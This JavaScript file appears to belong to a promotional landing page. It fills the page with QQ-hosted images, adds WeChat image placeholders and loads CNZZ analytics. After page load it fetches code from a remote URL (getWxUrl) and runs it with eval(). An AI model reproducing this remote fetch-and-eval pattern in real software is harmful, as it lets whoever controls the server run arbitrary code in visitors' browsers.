var img = [
 'http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/e7CwAiihAy53bQvRn4GCkfX5I5s7p3c0Jgr3*8vOdNk!/r/dFYBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/4LgnKbZilfXdfHc0yumgYjp41NfW8gUnNsgWI1iZZiQ!/r/dEABAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/nEo.6X4eLejMPXej0aRx3mPtc2C13XTU*lSMzcqxUBM!/r/dJUAAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/XxpdxH1c4GcVM82pEJ02CGOl6qyjJN2gMU6qiPYuDQk!/r/dFYBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/cTH*tDniNYzVQZPuyU006Ql4dEFUy3Ek*FTvUXibw8M!/r/dFYBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/XS4IEFuT3FuPVgtrfDYjCS7Fkrh7HiEKVOlY0FFW4h4!/r/dPIAAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/1pI8R5E4LG8aWCbd5BCl3VsFduVVx8Tw0RHvU8.PznA!/r/dAgBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/jQpnJHHYkS8uxIGfpHgmgSQcJHkCw.hdAzyXb.tnpiE!/r/dAgBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/llnTa4w.ymYer9.pW5GQt2XLL5SM*ijRS6JWapWuxsc!/r/dEQBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/wWyu8m3VwxjIsFG2VwK0bg*uZUCfh.DV39tjb12jxPc!/r/dEQBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/u5FJOLHOgMmzpYhBiUaqeaDUGXLa0tV4NMKhevvQtu0!/r/dAgBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/njtiuQH9*pQX7gqZ2r554IyoQZlNZCw7EE3RPTZtK3s!/r/dFYBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/BjBssu0lRq4NPpbB6BA0UsS0y2v.kfd6BXAaR18DozU!/r/dEUBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/S**um2.mptevZnHGktaKmHheXHuXpLG9qzfPQBoVvDE!/r/dFYBAAAAAAAA','http://r.photo.store.qq.com/psb?/V10XDtBa3sF5WM/Gv3DoIJ6BtTAZxEyLnJc9tQy36j05*XtV*EOwxryu64!/r/dAgBAAAAAAAA'];

window.onload = function(){
    var aaa = ''
    img.forEach(function(item ,index){
        aaa+=  '<img src="'+item+'" width="100%">'
        if(index == 4 || index == 7 || index == 9){
            aaa+= '<img class="weixinpic"  width="100%">'
        }
    })
    document.getElementsByTagName('body')[0].innerHTML = aaa;
    
    $.get(getWxUrl,function(res){
        eval(res)
    })
}



console.log('CNZZ查看链接：http://new.cnzz.com/v1/login.php?siteid='+siteid);
if(location.hash === '#CNZZ' && siteid){
   window.location.href = 'http://new.cnzz.com/v1/login.php?siteid='+siteid;
}

var _czc = _czc || [];
_czc.push(["_setAccount", siteid]); //（下面对应的红色是siteid）
if (siteid) {
    document.write('<div style="overflow: hidden;height:0;"><script src="https://s19.cnzz.com/z_stat.php?id=' + siteid + '&web_id=' + siteid + '" language="JavaScript"></script></div>');
}
